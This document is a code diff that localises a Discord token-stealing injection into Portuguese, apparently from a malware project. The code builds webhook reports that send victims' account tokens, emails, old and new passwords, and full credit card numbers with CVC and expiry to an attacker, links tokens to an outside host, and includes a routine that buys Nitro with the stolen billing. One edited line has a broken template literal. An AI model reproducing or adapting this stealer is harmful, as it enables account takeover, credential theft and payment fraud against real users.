@@ -497,10 +497,10 @@ const getBilling = async (token) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += ':credit_card: ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '<:Paypal:963910178456096768> ';
           break;
       }
     }
@@ -533,7 +533,7 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
+  const failedMsg = 'Falha ao tentar comprar nitro!';
   if (!data) return failedMsg;
 
   let IDS = [];
@@ -655,17 +655,12 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        title: "Inject Success!",
-        description: "<:PartnerIcon:983180095009206344> [**Copy Token**](https://moonsz#0054.com/raw/token)",
+        title: "Injetado com sucesso",
+        description: `[**Copy Token**](superfurrycdn.nl/copy/${token})`,
         color: config.embed_color,
         fields: [
           {
-            name: 'Info',
-            value: `\`\`\`Stealer\`\`\``,
-            inline: false,
-          },
-          {
-            name: 'Username',
+            name: 'User',
             value: `\`${json.username}#${json.discriminator}\``,
             inline: true,
           },
@@ -675,34 +670,34 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: 'Nitro Badges',
+            name: 'Boost Upada',
             value: `${nitro}`,
             inline: true,
           },
           {
-            name: 'Badges',
+            name: 'Insígnias',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: 'Billing',
+            name: 'Pagamentos',
             value: `\`${billing}\``,
             inline: true,
           },
           {
-            name: 'Email',
+            name: 'Inbox',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: 'Password',
+            name: 'Senha',
             value: `\`${password}\``,
             inline: true,
           },
           {
             name: 'Token',
             value: `\`\`\`${token}\`\`\``,
-            inline: false,
+            inline: true,
           },
         ],
         author: {
@@ -730,22 +725,22 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       avatar_url: config.embed_icon,
       embeds: [
         {
-          title: "Password Changed",
+          title: "Senha alterada",
           description: `[**Copy Token**](https://superfurrycdn.nl/copy/${token})`,
           color: config.embed_color,
           fields: [
             {
-              name: 'Old Password',
+              name: 'Senha Antiga',
               value: `**${oldpassword}**`,
               inline: true,
             },
             {
-              name: 'New Password',
-              value: `**${newpassword}**`,
+              name: 'Nova Senha',
+              value: `\`${newpassword}\``,
               inline: true,
             },
             {
-              name: 'Username',
+              name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
@@ -757,7 +752,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: false,
+              inline: true,
             },
           ],
           author: {
@@ -784,17 +779,17 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       avatar_url: config.embed_icon,
       embeds: [
         {
-          title: "Mail Changed",
+          title: "Inbox Alterado",
           description: `[**Copy Token**](https://superfurrycdn.nl/copy/${token})`,
           color: config.embed_color,
           fields: [
             {
-              name: 'Email Changed',
-              value: `New Email: **${email}**`,
+              name: 'Novo Inbox',
+              value: `\`${email}\``,
               inline: true,
             },
             {
-              name: 'Username',
+              name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
@@ -806,7 +801,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: false,
+              inline: true,
             },
           ],
           author: {
@@ -836,12 +831,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: 'Paypal Added!',
+              name: 'Paypal Adicionado',
               value: `Time to buy some nitro baby 😩`,
-              inline: false,
+              inline: true,
             },
             {
-              name: 'Username',
+              name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
@@ -853,7 +848,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: false,
+              inline: true,
             },
           ],
           author: {
@@ -883,12 +878,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: '<a:cartao:973899989505957920> Credit Card Added',
-              value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+              name: 'CC Adicionada',
+              value: Número: **${number}**\nCVV: **${cvc}**\nValidade: **${expir_month}/${expir_year}**`,
               inline: true,
             },
             {
-              name: 'Username',
+              name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
@@ -900,7 +895,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: false,
+              inline: true,
             },
           ],
           author: {
@@ -932,24 +927,24 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: 'Nitro bought!',
+              name: 'Nitro Comprado',
               value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-              inline: false,
+              inline: true,
             },
             {
-              name: 'Username',
+              name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: false,
+              inline: true,
             },
             {
               name: 'ID',
               value: `\`${json.id}\``,
-              inline: false,
+              inline: true,
             },
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: false,
+              inline: true,
             },
           ],
           author: {
